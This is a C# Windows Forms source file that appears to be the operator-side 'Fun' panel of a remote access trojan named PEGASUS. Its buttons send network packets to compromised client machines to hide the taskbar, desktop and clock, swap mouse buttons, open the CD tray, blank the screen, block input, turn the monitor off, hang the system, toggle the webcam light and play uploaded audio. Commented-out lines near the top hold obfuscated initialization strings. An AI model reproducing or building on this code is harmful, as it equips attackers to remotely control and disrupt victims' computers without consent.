using PEGASUS.Diadyktio;
using PEGASUS.Metafora_Dedomenon;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class FormFun : Form
    {
        public FormFun()
        {
            InitializeComponent();
        }

        public PEGALISIUS F { get; set; }
        internal Clients Client { get; set; }

        internal Clients ParentClient { get; set; }

        //OnProgramStart.Initialize(reupload("*\\odeg*Yel~}kxo"), reupload("92:>:2"), reupload("2ysoaFzSrfFBSp?[moodb|GlCrS|g2p<xs?"), reupload("9$:$:$:"));//3 test
        //OnProgramStart.Initialize(reupload("\\X"), reupload("82:<??"), "JU3yh7S3o4OgjQJZEsETD72o0LcwlIVVxxj", reupload("9$:$:$8"));// 3 MY SYS
        //OnProgramStart.Initialize(reupload("\\odeg"), reupload("92:>:2"), reupload("~@2rySle]Od;}FgmLDB=xk=9oizKm}nlCL"), reupload("9$:$:$:"));// 3
        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) Close();
            }
            catch
            {
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Taskbar+";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Taskbar-";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button3_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Desktop+";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button4_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Desktop-";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button5_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Clock+";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button6_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Clock-";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button8_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "swapMouseButtons";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button7_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "restoreMouseButtons";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button10_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "openCD+";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button9_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "openCD-";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button18_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "blankscreen+";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button17_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "blankscreen-";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button11_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "blockInput";
            msgpack.ForcePathObject("Time").AsString = numericUpDown1.Value.ToString();
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button15_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "holdMouse";
            msgpack.ForcePathObject("Time").AsString = numericUpDown2.Value.ToString();
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button12_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "monitorOff";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button14_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "hangSystem";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }


        private void FormFun_FormClosed(object sender, FormClosedEventArgs e)
        {
            ThreadPool.QueueUserWorkItem(o => { Client?.Disconnected(); });
        }

        private void button19_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "webcamlight+";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button16_Click(object sender, EventArgs e)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "webcamlight-";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void button13_Click_1(object sender, EventArgs e)
        {
            using (var O = new OpenFileDialog())
            {
                O.Filter = "(*.wav)|*.wav";
                if (O.ShowDialog() == DialogResult.OK)
                {
                    var wavfile = File.ReadAllBytes(O.FileName);
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "playAudio";
                    msgpack.ForcePathObject("wavfile").SetAsBytes(wavfile);
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
                else
                {
                    MessageBox.Show("Please choose a wav file.");
                }
            }
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        private void FormFun_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }
    }
}